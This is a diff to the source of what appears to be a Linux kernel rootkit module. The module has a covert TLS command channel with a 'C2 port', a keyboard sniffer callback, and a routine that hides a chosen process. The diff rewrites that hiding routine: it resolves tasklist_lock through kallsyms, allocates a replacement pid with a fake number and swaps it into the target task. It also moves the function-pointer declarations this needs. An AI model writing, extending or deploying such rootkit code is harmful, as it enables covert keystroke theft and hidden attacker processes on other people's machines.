@@ -32,6 +32,11 @@
 #define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
 #endif
 
+static asmlinkage void (*change_pidR)(
+        struct task_struct* task, enum pid_type type, struct pid* pid);
+static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
+
+
 struct service {
     struct socket* tls_socket;
     struct task_struct* read_thread;
@@ -243,10 +248,11 @@ int read_TLS(void) {
     const char* unknown = "Unknown command\n";
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
-    struct task_struct *ts;
+    struct task_struct* ts;
     char proc_name[TASK_COMM_LEN];
     struct pid* newpid;
     int z = 0;
+    rwlock_t* lo;
 
     while (!kthread_should_stop()) {
         tmp_port = 0;
@@ -313,8 +319,25 @@ int read_TLS(void) {
                 if (ts->pid == tmp_port) {
                     printk(KERN_INFO "Hiding PID %d\n", tmp_port);
 
-                    newpid = get_task_pid(ts, PIDTYPE_PID);
-                    newpid->numbers[0].nr = 761;
+                    //newpid = get_task_pid(ts, PIDTYPE_PID);
+                    //newpid->numbers[0].nr = 761;
+
+
+                    lo = kallsyms_lookup_name("tasklist_lock");
+                    write_lock(lo);
+
+                    if (lo) {
+                        printk(KERN_INFO "Found my lock\n");
+                    } else {
+                        printk(KERN_INFO "Bad lookup name\n");
+                    }
+
+                    newpid = alloc_pidR(get_task_pid(ts, PIDTYPE_PID)->numbers[0].ns);
+                    newpid->numbers[0].nr = 76831;
+                    newpid->numbers[0].ns->parent = ns_of_pid(find_vpid(1));
+                    change_pidR(ts, PIDTYPE_PID, newpid);
+
+                    write_unlock(lo);
                 }
             }
         } else {
@@ -489,10 +512,6 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
 
     return NOTIFY_OK;
 }
-
-static asmlinkage void (*change_pidR)(
-        struct task_struct* task, enum pid_type type, struct pid* pid);
-static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
 
 int my_change_pid(void* data) {
 #if 0
